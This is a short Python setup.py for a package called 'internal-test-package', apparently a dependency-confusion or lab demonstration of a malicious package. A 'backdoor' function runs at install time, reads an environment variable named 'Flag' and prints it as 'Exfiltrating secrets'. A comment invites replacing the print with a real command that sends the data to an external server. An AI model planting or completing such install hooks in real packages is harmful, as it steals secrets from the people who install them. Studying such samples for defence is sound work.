from setuptools import setup
import os

def backdoor():
    secrets = os.getenv("Flag")
    print(f"Exfiltrating secrets: {secrets}")
    # Replace this with a real exfiltration command
    # e.g., send data to an external server

backdoor()

setup(
    name="internal-test-package",
    version="1.0.0",
    description="Malicious version of the internal test package",
    py_modules=["internal_module"],
)
